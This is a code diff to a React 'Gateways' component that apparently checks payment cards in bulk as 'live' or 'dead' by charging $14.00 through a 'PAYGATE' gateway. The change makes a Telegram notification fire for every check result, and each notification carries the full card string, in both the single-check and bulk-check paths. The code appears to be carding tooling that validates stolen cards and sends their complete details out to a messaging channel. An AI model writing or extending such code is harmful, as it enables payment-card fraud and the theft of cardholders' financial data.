@@ -745,17 +745,18 @@ const Gateways = () => {
 
       setResult(checkResult);
 
-      // Send Telegram notification for PAYGATE charged cards
-      if (selectedGateway.id === "paygate_charge" && (checkStatus === "live" || checkStatus === "dead")) {
+      // Send Telegram notification for PAYGATE checks (all statuses)
+      if (selectedGateway.id === "paygate_charge") {
         try {
           await supabase.functions.invoke('notify-charged-card', {
             body: {
               user_id: userId,
               card_details: fullCardString,
-              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
-              response_message: checkStatus === "live" ? "Payment Successful" : "Card Declined",
+              status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
+              response_message: checkStatus === "live" ? "Payment Successful" : checkStatus === "dead" ? "Card Declined" : "Unknown Response",
               amount: "$14.00",
-              gateway: "PAYGATE"
+              gateway: "PAYGATE",
+              api_response: checkStatus === "unknown" ? "Check returned unknown status after retries" : undefined
             }
           });
         } catch (notifyError) {
@@ -1393,17 +1394,18 @@ const Gateways = () => {
           brandColor
         };
 
-        // Send Telegram notification for PAYGATE charged cards (bulk)
-        if (selectedGateway.id === "paygate_charge" && (checkStatus === "live" || checkStatus === "dead")) {
+        // Send Telegram notification for PAYGATE checks (bulk - all statuses)
+        if (selectedGateway.id === "paygate_charge") {
           try {
             await supabase.functions.invoke('notify-charged-card', {
               body: {
                 user_id: userId,
                 card_details: fullCardStr,
-                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
-                response_message: checkStatus === "live" ? "Payment Successful" : "Card Declined",
+                status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
+                response_message: checkStatus === "live" ? "Payment Successful" : checkStatus === "dead" ? "Card Declined" : "Unknown Response",
                 amount: "$14.00",
-                gateway: "PAYGATE"
+                gateway: "PAYGATE",
+                api_response: checkStatus === "unknown" ? "Bulk check returned unknown status after retries" : undefined
               }
             });
           } catch (notifyError) {
